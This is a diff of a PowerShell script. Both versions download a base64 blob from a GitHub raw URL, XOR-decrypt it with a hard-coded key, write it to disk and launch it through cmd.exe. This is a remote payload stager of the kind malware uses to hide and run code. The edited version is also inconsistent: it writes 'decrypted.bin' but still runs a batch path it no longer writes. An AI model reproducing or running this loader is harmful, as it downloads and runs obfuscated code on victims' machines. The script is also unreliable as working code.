@@ -2,16 +2,19 @@ $u='https://raw.githubusercontent.com/Jakeryan500/a/refs/heads/main/skibidi'
 $k='moon'
 $p="$env:USERPROFILE\output.bat"
 
-$d=(iwr $u -UseBasicParsing).Content.Trim()
-$b=[Convert]::FromBase64String($d)
-$kb=[Text.Encoding]::UTF8.GetBytes($k)
+$d = ((Invoke-WebRequest $u -UseBasicParsing).Content -replace '\s','')
+$b = [Convert]::FromBase64String($d)
 
-$out=New-Object byte[] $b.Length
-for($i=0;$i -lt $b.Length;$i++){
-    $out[$i]=$b[$i] -bxor $kb[$i % $kb.Length]
+$kb = [Text.Encoding]::UTF8.GetBytes($k)
+if ($kb.Length -eq 0) { throw "Key is empty" }
+
+$out = New-Object byte[] $b.Length
+
+for ($i = 0; $i -lt $b.Length; $i++) {
+    $out[$i] = $b[$i] -bxor $kb[$i % $kb.Length]
 }
 
-[IO.File]::WriteAllBytes($p,$out)
+[IO.File]::WriteAllBytes("decrypted.bin", $out)
 
 
 Start-Process cmd.exe -ArgumentList '/c $p' -UseNewEnvironment -Wait
